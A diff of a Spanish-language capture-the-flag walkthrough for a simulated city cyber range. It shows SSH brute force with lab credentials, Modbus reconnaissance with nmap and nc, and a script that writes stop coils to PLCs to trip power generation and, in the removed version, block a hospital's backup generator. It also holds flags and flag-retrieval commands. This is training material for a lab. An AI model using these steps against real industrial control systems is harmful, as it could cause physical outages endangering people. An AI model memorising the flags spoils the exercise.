@@ -1,88 +1,83 @@
-# Escenario CTF 01: Apagón Urbano en Cascada (GICSP / IEC 62443 Style)
+# Escenario CTF 01: Apagón Urbano en Cascada (THM / HTB Style)
 
 **Dificultad**: Media  
-**Categoría**: Industrial Cybersecurity / OT Hacking / CPS Cascading Failures / GICSP Pivoting  
+**Categoría**: Industrial Cybersecurity / OT Hacking / CPS Cascading Failures  
 **Autor**: CityLab Cyber Range  
 
 ---
 
 ## 1. Breve del Escenario (Storyline)
 
-Una célula adversaria ha ganado acceso inicial a la terminal de la zona corporativa (`10.0.1.10` / `h_attacker`). El objetivo táctico es comprometer la red de infraestructura crítica de la ciudad mediante reconocimiento de red, fuerza bruta SSH a los pivotes DMZ, escalamiento hacia la Estación de Ingeniería (`h_ews` @ `10.0.2.30`), y ejecución de sabotaje dual sobre la subestación eléctrica y el relé de respaldo del hospital.
+Una célula adversaria ha ganado acceso inicial a la red corporativa de la municipalidad (`10.0.1.10`). El objetivo táctico es comprometer la red de infraestructura crítica de la ciudad, provocando un colapso en cascada que afecte la generación eléctrica, el suministro de agua potable y la red de semáforos urbanos.
 
 ---
 
 ## 2. Mapa de Red e IPs Relevantes
 
 - **Atacante (Corporate Zone)**: `10.0.1.10` (`h_attacker`)
-- **Salto DMZ (DMZ Zone)**: `10.0.2.10` (`h_dmz`) — Credenciales: `sysadmin:password123`
+- **Salto DMZ (DMZ Zone)**: `10.0.2.10` (`h_dmz`)
 - **Servidor SCADA Central (DMZ)**: `10.0.2.20:8080` (`h_scada`)
-- **Estación de Ingeniería (DMZ)**: `10.0.2.30` (`h_ews`) — Credenciales por defecto: `admin:admin123`
 - **PLC Agua OT**: `10.0.3.10:502` (`h_plc`)
 - **PLC Gas OT**: `10.0.3.12:502` (`h_plc_gas`)
 - **PLC Eléctrico OT**: `10.0.3.13:502` (`h_plc_elec`)
-- **PLC Transporte OT**: `10.0.3.14:502` (`h_plc_trans`)
-- **PLC Hospital OT**: `10.0.3.15:502` (`h_plc_hosp`)
+- **PLC Transporte OT**: `10.0.3.14:502` (`h_plc_tr`)
 
 ---
 
 ## 3. Cadena de Ataque (Walkthrough Paso a Paso)
 
-### Paso 1: Reconocimiento y Fuerza Bruta SSH a DMZ
-1. Abrir la terminal interactiva nativa del atacante:
+### Paso 1: Pivoteo de Corporate a DMZ
+1. Desde la máquina de ataque, verificar conectividad con la DMZ (`10.0.2.10`):
    ```bash
-   ./lab_terminal.sh attacker
+   ping -c 2 10.0.2.10
+   ssh user@10.0.2.10
    ```
-2. Realizar escaneo de red sobre la zona DMZ:
+2. Inspeccionar la API REST del Servidor SCADA Central:
    ```bash
-   nmap -sV -p 22,80,8080 10.0.2.0/24
+   curl -s http://10.0.2.20:8080/api/telemetry | jq .
    ```
-3. Ejecutar fuerza bruta SSH contra `h_dmz` (`10.0.2.10`):
-   ```bash
-   hydra -l sysadmin -p password123 ssh://10.0.2.10
-   ```
+   *Obtener estado de bobinas Modbus y telemetría de todos los sectores.*
 
-### Paso 2: Pivoteo a la Estación de Ingeniería (`h_ews` @ `10.0.2.30`)
-1. Iniciar sesión SSH en `h_dmz`:
-   ```bash
-   ssh sysadmin@10.0.2.10
-   ```
-2. Acceder a la Estación de Ingeniería `h_ews` usando credenciales de fábrica:
-   ```bash
-   ssh admin@10.0.2.30
-   ```
-3. Verificar acceso directo hacia la celda OT Modbus/TCP (`10.0.3.0/24`):
+### Paso 2: Reconocimiento Modbus en la Zona OT (`10.0.3.0/24`)
+1. Probar acceso al puerto `TCP/502` de los PLCs desde la DMZ (o vía Modbus Proxy en `10.0.2.20:15020` con Unit ID 3):
    ```bash
    nc -zv 10.0.3.13 502
-   nc -zv 10.0.3.15 502
    ```
-
-### Paso 3: Sabotaje Bloqueo Generador Hospital (`10.0.3.15:502`)
-1. Desde `h_ews` o mediante el script multisectorial, inyectar `Coil 1 = 1` en el PLC del Hospital:
+2. Enviar comando de encendido / habilitación al PLC eléctrico (`Coil 0: start_cmd`, `Coil 2: actuator_running`):
    ```bash
-   python3 attacker/attack_multisector.py --sector hospital --mode stop
+   python3 attacker/attack_multisector.py --sector elec --mode start
    ```
-   *Efecto*: Bloquea el relé de arranque del generador diésel (`suppress_generator = True`), forzando al hospital a depender 100% de la batería UPS durante un corte eléctrico.
 
-### Paso 4: Disparo Eléctrico Cinético (`10.0.3.13:502`)
-1. Forzar la detención de la generación eléctrica (`Coil 1 = 1` en `10.0.3.13`):
+### Paso 3: Inyección de Disparo Eléctrico (Sabotaje Cinético)
+1. Forzar la detención de generación eléctrica mediante comando de parada (`Coil 1 = 1` / `stop_cmd` en `10.0.3.13`):
    ```bash
    python3 attacker/attack_multisector.py --sector elec --mode stop
    ```
 
-### Paso 5: Validación de Cascada Completa y Apagón Hospitalario
+### Paso 4: Validación del Efecto Dominó en Cascada
 1. Monitorear el registro centralizado de eventos (`cascading_events.csv`):
-   - **T+0s**: `grid_freq_hz` cae por debajo de $58.0\text{ Hz}$.
-   - **T+2s**: `hospital_on_ups = 1` (Hospital entra en UPS, pero el generador diésel está bloqueado por el ataque al PLC `10.0.3.15`).
-   - **T+5s**: `grid_voltage_pu` cae a $0.0\text{ pu}$.
+   - **T+0s**: `grid_freq_hz` cae de $60.0\text{ Hz}$ a $<58.0\text{ Hz}$.
+   - **T+2s**: `hospital_on_ups = 1` (Failover del Hospital a baterías/generador diésel).
+   - **T+5s**: `grid_voltage_pu` cae a $0.0\text{ pu} \implies \text{power\_available} = \text{False}$.
    - **T+7s**: Bomba P1 de Agua se apaga por falta de energía.
-   - **T+12s**: Semáforos urbanos entran en `FLASHING_YELLOW_EMERGENCY`.
-   - **T+30s**: Batería UPS de $75\text{ kWh}$ del hospital se agota por completo $\implies$ `CRITICAL_BLACKOUT`.
+   - **T+12s**: Semáforos urbanos entran en `FLASHING_YELLOW_EMERGENCY` $\implies \text{transport\_congestion} \to 1.0$.
+   - **T+20s**: Tanque T2 de Agua se vacía por consumo urbano $\implies \text{water\_trip} = 1$.
+   - **Alerta final**: `CASCADING_BLACKOUT+HOSPITAL_UPS`.
 
 ---
 
 ## 4. Flags del Desafío CTF
 
-- **FLAG 1 (DMZ Pivoting)**: `FLAG_1{dmz_pivoting_modbus_recon_8492}`
-- **FLAG 2 (Engineering Workstation Compromise)**: `FLAG_2{ews_station_compromised_admin_0921}`
-- **FLAG 3 (Hospital Generator Suppressed & Blackout)**: `FLAG_3{hospital_generator_suppressed_critical_blackout_9918}`
+Las flags de este escenario son generadas y verificadas dinámicamente por el servidor en función de la semilla de sesión `CITYLAB_SESSION_SEED` y el cumplimiento de las condiciones físicas y operativas reales.
+
+### 🏁 Obtención y Verificación de Flags:
+```bash
+# Evaluar cumplimiento de objetivos y obtener flags server-side:
+python3 scripts/run_scenario.py --id 01 --check
+
+# O mediante consulta REST al Flag Service:
+curl -s http://10.0.2.20:8570/api/flag/mint/01/FLAG_1
+
+# Enviar flag obtenida para registro en el Scoreboard:
+python3 scripts/run_scenario.py --id 01 --submit "FLAG_1{...}" --team "tu_equipo"
+```
